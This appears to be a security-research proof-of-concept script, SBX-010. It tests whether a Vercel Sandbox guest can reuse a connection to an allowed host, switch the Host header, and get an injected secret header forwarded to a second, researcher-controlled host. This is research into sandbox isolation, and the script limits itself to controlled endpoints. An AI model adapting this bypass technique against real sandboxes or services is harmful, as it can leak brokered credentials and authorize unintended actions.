import "dotenv/config";

import { createHash, randomBytes, randomUUID } from "node:crypto";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { resolve } from "node:path";
import { Sandbox } from "@vercel/sandbox";
import { HttpObserverClient } from "../../src/observer-client.js";
import type { ObserverEvent } from "../../src/contracts.js";

const brokeredHeader = "x-sbx-harness-canary";
const remoteAuthorityProbe = "/tmp/sbx-010/authority-probe.mjs";
const remoteReuseProbe = "/tmp/sbx-010/h1-authority-reuse-probe.mjs";

interface CommandRecord {
  caseId: string;
  exitCode: number;
  result: Record<string, unknown>;
  stderr: string;
}

interface ActionRecord {
  operationId: string;
  authorizedAt: string;
  caseId: string;
  normalizedPath: string;
}

function required(name: string): string {
  const value = process.env[name];
  if (!value) throw new Error(`${name} is required`);
  return value;
}

function controlledOrigin(name: string): URL {
  const url = new URL(required(name));
  if (url.protocol !== "https:" || url.username || url.password || url.pathname !== "/" || url.search || url.hash) {
    throw new Error(`${name} must be an HTTPS origin without credentials, path, query, or fragment`);
  }
  return url;
}

function explicitCredentials():
  | { token: string; teamId: string; projectId: string }
  | Record<string, never> {
  const token = process.env.VERCEL_TOKEN;
  const teamId = process.env.VERCEL_TEAM_ID;
  const projectId = process.env.VERCEL_PROJECT_ID;
  const count = [token, teamId, projectId].filter(Boolean).length;
  if (count !== 0 && count !== 3) {
    throw new Error("VERCEL_TOKEN, VERCEL_TEAM_ID, and VERCEL_PROJECT_ID must be supplied together");
  }
  return count === 3 ? { token: token!, teamId: teamId!, projectId: projectId! } : {};
}

function sha256(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

function singleHeader(event: ObserverEvent | undefined, name: string): string | undefined {
  const value = event?.headers[name.toLowerCase()];
  return Array.isArray(value) ? value[0] : value;
}

function eventHostname(event: ObserverEvent): string | undefined {
  if (!event.host) return undefined;
  try {
    return new URL(`https://${event.host}/`).hostname.toLowerCase();
  } catch {
    return undefined;
  }
}

function responseBody(result: Record<string, unknown>): string | undefined {
  const response = result.response;
  if (!response || typeof response !== "object") return undefined;
  const body = (response as Record<string, unknown>).body;
  return typeof body === "string" ? body : undefined;
}

function parseJsonBody(body: unknown): Record<string, unknown> | undefined {
  if (typeof body !== "string" || body.length === 0) return undefined;
  try {
    const value = JSON.parse(body) as unknown;
    return value !== null && typeof value === "object" && !Array.isArray(value)
      ? value as Record<string, unknown>
      : undefined;
  } catch {
    return undefined;
  }
}

async function adminRequest(
  baseUrl: string,
  adminKey: string,
  runId: string,
  resource: "vhost-config" | "vhost-actions",
  init?: RequestInit,
): Promise<Response> {
  const headers = new Headers(init?.headers);
  headers.set("authorization", `Bearer ${adminKey}`);
  return fetch(new URL(`/v1/runs/${encodeURIComponent(runId)}/${resource}`, baseUrl), {
    ...init,
    headers,
    signal: AbortSignal.timeout(10_000),
  });
}

async function actions(baseUrl: string, adminKey: string, runId: string): Promise<ActionRecord[]> {
  const response = await adminRequest(baseUrl, adminKey, runId, "vhost-actions");
  if (!response.ok) throw new Error(`observer vhost action query returned ${response.status}`);
  const body = (await response.json()) as { actions?: ActionRecord[] };
  if (!Array.isArray(body.actions)) throw new Error("observer returned invalid vhost actions");
  return body.actions;
}

async function main(): Promise<void> {
  const startedAt = new Date().toISOString();
  const observerA = controlledOrigin("OBSERVER_A_URL");
  const observerB = controlledOrigin("OBSERVER_B_URL");
  if (observerA.hostname === observerB.hostname) throw new Error("observer hostnames must be distinct");
  const adminKey = required("OBSERVER_ADMIN_KEY");
  const clients = [
    new HttpObserverClient(observerA.origin, adminKey),
    new HttpObserverClient(observerB.origin, adminKey),
  ];
  await Promise.all(clients.map((client) => client.health()));

  const runId = randomUUID();
  const correlationCanary = `corr_${randomBytes(18).toString("base64url")}`;
  const brokeredSecret = `broker_${randomBytes(24).toString("base64url")}`;
  const controlledHosts = [observerA.hostname, observerB.hostname];
  const forbiddenGuestValues = [adminKey, brokeredSecret, process.env.VERCEL_TOKEN ?? ""].filter(Boolean);
  const requestPath = `/v1/probe/${encodeURIComponent(runId)}/vhost-action`;
  const commandRecords: CommandRecord[] = [];
  const cleanup = {
    stopped: false,
    deleted: false,
    vhostConfigsDeleted: false,
    errors: [] as string[],
  };
  let sandbox: Sandbox | undefined;
  let sandboxIdentity: Record<string, unknown> | undefined;
  let allEvents: ObserverEvent[] = [];
  let allActions: ActionRecord[] = [];
  let executionError: string | undefined;

  try {
    const registrations = await Promise.all(
      [observerA.origin, observerB.origin].map((origin) =>
        adminRequest(origin, adminKey, runId, "vhost-config", {
          method: "POST",
          headers: {
            "x-observer-vhost": observerB.host,
            "x-observer-action-secret": brokeredSecret,
          },
        }),
      ),
    );
    if (registrations.some((response) => !response.ok)) {
      throw new Error(`observer vhost registration failed: ${registrations.map((response) => response.status).join(",")}`);
    }

    sandbox = await Sandbox.create({
      name: `sbx-010-poc-${runId.slice(0, 8)}`,
      persistent: false,
      timeout: 300_000,
      networkPolicy: {
        allow: {
          [observerA.hostname]: [
            { transform: [{ headers: { [brokeredHeader]: brokeredSecret } }] },
          ],
        },
      },
      tags: { harness: "vsc", test: "SBX-010", run: runId.slice(0, 12) },
      ...explicitCredentials(),
    });
    const session = sandbox.currentSession();
    sandboxIdentity = {
      name: sandbox.name,
      sessionId: session.sessionId,
      sessionCreatedAt: session.createdAt.toISOString(),
      region: session.region,
    };
    const [authoritySource, reuseSource] = await Promise.all([
      readFile(resolve("guest/authority-probe.mjs"), "utf8"),
      readFile(resolve("guest/h1-authority-reuse-probe.mjs"), "utf8"),
    ]);
    await sandbox.writeFiles([
      { path: remoteAuthorityProbe, content: authoritySource, mode: 0o700 },
      { path: remoteReuseProbe, content: reuseSource, mode: 0o700 },
    ]);

    const activeSandbox = sandbox;
    async function runProbe(caseId: string, remotePath: string, configuration: Record<string, unknown>): Promise<Record<string, unknown>> {
      const serialized = JSON.stringify(configuration);
      if (forbiddenGuestValues.some((value) => serialized.includes(value))) {
        throw new Error(`proof invalid: ${caseId} guest configuration contains controller-only material`);
      }
      const command = await activeSandbox.runCommand({
        cmd: "node",
        args: [remotePath, Buffer.from(serialized).toString("base64url")],
        timeoutMs: 35_000,
      });
      const [stdout, stderr] = await Promise.all([command.stdout(), command.stderr()]);
      let result: Record<string, unknown>;
      try {
        result = JSON.parse(stdout) as Record<string, unknown>;
      } catch {
        throw new Error(`${caseId} emitted invalid JSON`);
      }
      commandRecords.push({ caseId, exitCode: command.exitCode, result, stderr: stderr.slice(0, 2_000) });
      return result;
    }

    const correlation = (caseId: string) => ({
      runId,
      testId: "SBX-010-POC",
      caseId,
      canary: correlationCanary,
    });
    await runProbe("direct-b-negative", remoteAuthorityProbe, {
      scopeConfirmation: "researcher-controlled-endpoints-only",
      researcherControlledHosts: controlledHosts,
      runId,
      testId: "SBX-010-POC",
      caseId: "direct-b-negative",
      destinationHost: observerB.hostname,
      destinationPort: 443,
      tlsServername: observerB.hostname,
      httpHost: observerB.host,
      requestTarget: `${requestPath}?phase=direct-b&${new URLSearchParams({
        __sbx_run: runId,
        __sbx_test: "SBX-010-POC",
        __sbx_case: "direct-b-negative",
        __sbx_canary: correlationCanary,
      })}`,
      headers: {},
      timeoutMs: 20_000,
    });
    await runProbe("one-shot-host-b", remoteAuthorityProbe, {
      scopeConfirmation: "researcher-controlled-endpoints-only",
      researcherControlledHosts: controlledHosts,
      runId,
      testId: "SBX-010-POC",
      caseId: "one-shot-host-b",
      destinationHost: observerA.hostname,
      destinationPort: 443,
      tlsServername: observerA.hostname,
      httpHost: observerB.host,
      requestTarget: `${requestPath}?phase=one-shot&${new URLSearchParams({
        __sbx_run: runId,
        __sbx_test: "SBX-010-POC",
        __sbx_case: "one-shot-host-b",
        __sbx_canary: correlationCanary,
      })}`,
      headers: {},
      timeoutMs: 20_000,
    });
    await runProbe("reuse-authority-switch", remoteReuseProbe, {
      scopeConfirmation: "I_CONTROL_ALL_LISTED_HOSTS",
      researcherControlledHosts: controlledHosts,
      connectHost: observerA.hostname,
      connectPort: 443,
      sniHost: observerA.hostname,
      firstHost: observerA.hostname,
      secondHost: observerB.hostname,
      firstPath: `${requestPath}?phase=first`,
      secondPath: `${requestPath}?phase=second`,
      timeoutMs: 20_000,
      maxResponseBytes: 4_096,
      correlation: correlation("reuse-authority-switch"),
    });

    await new Promise((resolveWait) => setTimeout(resolveWait, 1_500));
    [allEvents, allActions] = await Promise.all([
      clients[0]!.events(runId),
      actions(observerA.origin, adminKey, runId),
    ]);
  } catch (error) {
    executionError = error instanceof Error ? error.message : String(error);
  } finally {
    if (sandbox) {
      try {
        await sandbox.stop();
        cleanup.stopped = true;
      } catch (error) {
        cleanup.errors.push(`stop: ${error instanceof Error ? error.message : String(error)}`);
      }
      try {
        await sandbox.delete();
        cleanup.deleted = true;
      } catch (error) {
        cleanup.errors.push(`delete: ${error instanceof Error ? error.message : String(error)}`);
      }
    }
    try {
      const deletions = await Promise.all(
        [observerA.origin, observerB.origin].map((origin) =>
          adminRequest(origin, adminKey, runId, "vhost-config", { method: "DELETE" }),
        ),
      );
      cleanup.vhostConfigsDeleted = deletions.every((response) => response.status === 204);
      if (!cleanup.vhostConfigsDeleted) cleanup.errors.push("observer vhost cleanup failed");
    } catch (error) {
      cleanup.errors.push(`observer cleanup: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  const record = (caseId: string) => commandRecords.find((entry) => entry.caseId === caseId);
  const directB = record("direct-b-negative")?.result;
  const oneShot = record("one-shot-host-b")?.result;
  const reuse = record("reuse-authority-switch")?.result;
  const reuseRequests = Array.isArray(reuse?.requests) ? reuse.requests as Array<Record<string, unknown>> : [];
  const firstReuseResponse = reuseRequests[0]?.response as Record<string, unknown> | undefined;
  const secondReuseResponse = reuseRequests[1]?.response as Record<string, unknown> | undefined;
  const firstBody = parseJsonBody(firstReuseResponse?.body);
  const secondBody = parseJsonBody(secondReuseResponse?.body);
  const aEvents = allEvents.filter((event) => eventHostname(event) === observerA.hostname);
  const bEvents = allEvents.filter((event) => eventHostname(event) === observerB.hostname);
  const firstAEvent = aEvents.find((event) => event.caseId === "reuse-authority-switch");
  const secondBEvent = bEvents.find((event) => event.caseId === "reuse-authority-switch");
  const directBEvents = allEvents.filter((event) => event.caseId === "direct-b-negative");
  const oneShotEvents = allEvents.filter((event) => event.caseId === "one-shot-host-b");
  const reuseAction = allActions.find((action) => action.caseId === "reuse-authority-switch");
  const tls = reuse?.tls as Record<string, unknown> | undefined;
  const directBBlocked = directB?.ok === false && directBEvents.length === 0;
  const oneShotRejected =
    oneShot?.ok === true &&
    (oneShot.response as Record<string, unknown> | undefined)?.statusCode === 403 &&
    oneShotEvents.length === 0;
  const firstRequestAccepted =
    reuse?.ok === true &&
    tls?.handshakeCount === 1 &&
    firstReuseResponse?.statusCode === 421 &&
    firstBody?.selected === false &&
    singleHeader(firstAEvent, brokeredHeader) === brokeredSecret;
  const guestResponseContainsBrokeredSecret = commandRecords.some((entry) =>
    JSON.stringify(entry.result).includes(brokeredSecret)
  );
  const reusedRequestRejected =
    reuse?.ok === true && secondReuseResponse?.statusCode === 403 && secondBEvent === undefined;
  const reusedRequestBypassed =
    reuse?.ok === true &&
    secondReuseResponse?.statusCode === 200 &&
    secondBody?.selected === true &&
    secondBody.authorized === true &&
    !guestResponseContainsBrokeredSecret &&
    typeof secondBody.operationId === "string" &&
    secondBody.operationId === reuseAction?.operationId &&
    singleHeader(secondBEvent, brokeredHeader) === brokeredSecret &&
    allActions.length === 1;
  const controlsPassed = directBBlocked && oneShotRejected && firstRequestAccepted;
  const operationalFailure = executionError !== undefined || cleanup.errors.length > 0;
  const outcome = operationalFailure || !controlsPassed
    ? "indeterminate"
    : reusedRequestBypassed
      ? "candidate"
      : reusedRequestRejected
        ? "pass"
        : "indeterminate";

  const evidence = {
    schemaVersion: 1,
    testId: "SBX-010",
    runId,
    startedAt,
    completedAt: new Date().toISOString(),
    outcome,
    controlsPassed,
    candidate: outcome === "candidate",
    controls: { directBBlocked, oneShotRejected, firstRequestAccepted },
    signals: { reusedRequestRejected, reusedRequestBypassed },
    guestConfigurationContainsBrokeredSecret: false,
    guestResponseContainsBrokeredSecret,
    controllerBrokeredSecretSha256: sha256(brokeredSecret),
    observerBrokeredSecretSha256: sha256(singleHeader(secondBEvent, brokeredHeader) ?? ""),
    sandbox: sandboxIdentity,
    policy: {
      allow: {
        [observerA.hostname]: [
          { transform: [{ headers: { [brokeredHeader]: brokeredSecret } }] },
        ],
      },
    },
    commandRecords,
    observerEvents: { a: aEvents, b: bEvents },
    vhostActions: allActions,
    executionError,
    cleanup,
  };
  const artifactsDirectory = resolve(process.env.HARNESS_ARTIFACTS_DIR ?? "./artifacts");
  await mkdir(artifactsDirectory, { recursive: true, mode: 0o700 });
  const privateEvidencePath = resolve(artifactsDirectory, `SBX-010-poc-${runId}-private.json`);
  await writeFile(privateEvidencePath, `${JSON.stringify(evidence, null, 2)}\n`, { mode: 0o600 });
  process.stdout.write(`${JSON.stringify({
    outcome,
    controlsPassed,
    candidate: outcome === "candidate",
    controls: evidence.controls,
    signals: evidence.signals,
    cleanup,
    privateEvidencePath,
  }, null, 2)}\n`);
  if (operationalFailure) throw new Error([executionError, ...cleanup.errors].filter(Boolean).join("; "));
}

await main();
